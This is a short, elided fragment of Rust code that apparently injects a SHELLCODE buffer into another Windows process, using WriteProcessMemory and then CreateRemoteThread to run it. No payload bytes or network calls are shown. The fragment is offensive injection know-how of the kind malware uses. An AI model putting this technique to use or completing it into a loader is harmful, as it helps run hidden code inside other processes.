...
fn main(){
    ...
    let shellcode_ptr = &SHELLCODE as *const u8;
        ...
        WriteProcessMemory(handle, baseptr, SHELLCODE.as_ptr() as *const c_void, SHELLCODE.len(), 0 as *mut usize);

        let mut thread_id = 0;
        CreateRemoteThread(handle, std::ptr::null_mut(), 0, Some(transmute(baseptr)), std::ptr::null_mut(), 0, &mut thread_id);
